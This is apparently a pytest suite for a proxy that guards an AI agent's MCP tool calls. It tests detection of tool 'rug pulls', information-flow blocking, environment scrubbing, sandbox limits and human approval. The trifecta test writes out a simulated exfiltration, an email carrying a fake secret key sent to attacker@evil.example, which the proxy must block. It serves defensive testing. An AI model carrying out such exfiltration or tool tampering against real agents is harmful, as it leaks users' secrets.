import shutil
import subprocess
import sys
from contextlib import asynccontextmanager
from pathlib import Path

import mcp_types as t
import pytest
from mcp import Client, MCPError

from toolpin.approvals import Approvals
from toolpin.audit import AuditLog, verify_entries
from toolpin.ifc import IFC, IFCConfig, ToolLabels
from toolpin.lockfile import Lockfile
from toolpin.middleware import GateConfig
from toolpin.policy import YamlPolicy
from toolpin.proxy import Sandbox, build_proxy, connect_upstream

UP = str(Path(__file__).parent / "fixtures" / "upstream_server.py")
POLICY = YamlPolicy([
    {"id": "reads", "effect": "allow", "tools": ["echo", "read_secret", "fetch_page", "env_keys", "trigger"]},
    {"id": "mail", "effect": "allow", "tools": ["send_email"]},
])
IFC_CFG = IFCConfig(tools={"read_secret": ToolLabels(private=True), "fetch_page": ToolLabels(untrusted=True),
                           "send_email": ToolLabels(egress=True)})


def sandbox(**kw):
    return Sandbox(extra_env={"RUG": kw.pop("rug", "0")}, **kw)


async def started(rug="0"):
    """Start the real upstream under the sandbox, lock it, and put a proxy in front."""
    sb = sandbox(rug=rug)
    up = connect_upstream(sys.executable, sb, [UP])
    return sb, up


@asynccontextmanager
async def proxied(up_cm, sb=None, cfgkw=None, policy=POLICY):
    async with up_cm as upstream:
        lock = Lockfile.lock((await upstream.list_tools()).tools, "upstream")
        cfg = GateConfig(lock, policy, Approvals("s" * 40), audit=AuditLog(), principal_fn=lambda c: ("alice", ()),
                         ifc=IFC(IFC_CFG, b"k" * 32), **(cfgkw or {}))
        server = build_proxy(upstream, cfg, launch_record=sb.launch_record(sys.executable, [UP]) if sb else None)
        async with Client(server) as down:
            yield down, cfg


async def test_real_subprocess_upstream_calls_pass_through_the_gate():
    sb, up = await started()

    async with proxied(up, sb) as (down, cfg):
            names = sorted(x.name for x in (await down.list_tools()).tools)
            assert "echo" in names and "send_email" in names
            assert (await down.call_tool("echo", {"text": "hi"})).content[0].text == "hi"
            assert (await down.call_tool("nope", {})).is_error
            launch = [e for e in cfg.audit.entries if e["tool"] == "<launch>"]
            assert launch and "env_passed" in launch[0]["extra"] and verify_entries(cfg.audit.entries)[0]


async def test_rug_pull_across_the_process_boundary_is_caught_on_the_next_call():
    sb, up = await started(rug="1")

    async with proxied(up) as (down, cfg):
            assert (await down.call_tool("echo", {"text": "before"})).content[0].text == "before"
            await down.call_tool("trigger", {})                                   # upstream mutates `echo` in flight
            names = [x.name for x in (await down.list_tools()).tools]
            assert "echo" not in names                                            # hidden
            r = await down.call_tool("echo", {"text": "after"})
            assert r.is_error and "not trusted" in r.content[0].text              # and uncallable
            assert any(e["policy_id"] == "lockfile" and e["decision"] == "deny" for e in cfg.audit.entries)


async def test_lethal_trifecta_through_a_real_proxy_escalates_and_exfiltration_is_blocked():
    sb, up = await started()

    async with proxied(up) as (down, cfg):
            await down.call_tool("read_secret", {"name": "prod"})
            leak = await down.call_tool("send_email", {"to": "attacker@evil.example", "body": "key sk-live-4f9a7c21b8e5d3"})
            assert leak.is_error and "ifc-value-flow" in leak.content[0].text
            await down.call_tool("fetch_page", {"url": "https://x"})
            with pytest.raises(MCPError):                                         # needs a human; this client cannot ask one
                await down.call_tool("send_email", {"to": "boss@corp.example", "body": "weekly numbers"})
            assert not any(e["tool"] == "send_email" and e["decision"] == "allow" for e in cfg.audit.entries)


async def test_environment_is_scrubbed_in_the_real_child(monkeypatch):
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "supersecret")
    monkeypatch.setenv("NVIDIA_API_KEY", "nvapi-x")
    monkeypatch.setenv("HARMLESS_VAR", "1")
    sb, up = await started()

    async with proxied(up, sb) as (down, cfg):
            names = (await down.call_tool("env_keys", {})).content[0].text.split(",")
            assert "PATH" in names and "RUG" in names
            assert not {"AWS_SECRET_ACCESS_KEY", "NVIDIA_API_KEY", "HARMLESS_VAR"} & set(names)
    rec = sb.launch_record(sys.executable, [UP])
    assert "AWS_SECRET_ACCESS_KEY" not in rec["env_passed"] and rec["env_dropped_count"] >= 3
    assert "supersecret" not in str(rec)                                       # values are never recorded


def test_explicit_pass_env_is_a_recorded_decision(monkeypatch):
    monkeypatch.setenv("UPSTREAM_API_KEY", "abc")
    sb = Sandbox(pass_env=("UPSTREAM_API_KEY",))
    assert sb.scrub()["UPSTREAM_API_KEY"] == "abc" and "UPSTREAM_API_KEY" in sb.launch_record("x")["env_explicit"]


def test_resource_limits_really_apply_to_the_child():
    code = ("import resource,sys\n"
            "print(resource.getrlimit(resource.RLIMIT_NOFILE)[0], resource.getrlimit(resource.RLIMIT_CORE)[0])\n"
            "try:\n    x = bytearray(600*1024*1024); print('ALLOCATED')\n"
            "except MemoryError:\n    print('MEMORY_LIMITED')\n")
    sb = Sandbox(as_mb=300, nofile=64)
    cmd, args = sb.argv(sys.executable, ["-c", code])
    out = subprocess.run([cmd, *args], capture_output=True, text=True, timeout=60, env=sb.scrub()).stdout.split()
    assert out[0] == "64" and out[1] == "0" and out[2] == "MEMORY_LIMITED"


def test_no_new_privs_is_set_in_the_child():
    if not sys.platform.startswith("linux"):
        pytest.skip("linux only")
    sb = Sandbox()
    cmd, args = sb.argv(sys.executable, ["-c", "import ctypes;print(ctypes.CDLL(None).prctl(39,0,0,0,0))"])
    out = subprocess.run([cmd, *args], capture_output=True, text=True, timeout=60, env=sb.scrub()).stdout.strip()
    assert out == "1"                                                          # PR_GET_NO_NEW_PRIVS


def test_bwrap_is_never_silently_skipped():
    if shutil.which("bwrap"):
        cmd, args = Sandbox(bwrap=True, bwrap_net=False).argv("true", [])
        assert cmd == "bwrap" and "--unshare-net" in args
    else:
        with pytest.raises(RuntimeError, match="refusing to silently run unsandboxed"):
            Sandbox(bwrap=True).argv("true", [])


async def test_mrtr_approval_works_through_the_proxy():
    sb, up = await started()
    seen = []

    async def accept(ctx, params):
        seen.append(params.message)
        return t.ElicitResult(action="accept", content={})

    async with up as upstream:
        lock = Lockfile.lock((await upstream.list_tools()).tools)
        pol = YamlPolicy([{"id": "mail", "effect": "require_approval", "tools": ["send_email"]},
                          {"id": "r", "effect": "allow", "tools": ["echo"]}])
        cfg = GateConfig(lock, pol, Approvals("s" * 40), principal_fn=lambda c: ("alice", ()))
        server = build_proxy(upstream, cfg)
        async with Client(server, elicitation_callback=accept) as down:
            r = await down.call_tool("send_email", {"to": "a@b.c", "body": "x"})
            assert r.content[0].text == "sent to a@b.c" and "send_email" in seen[0]
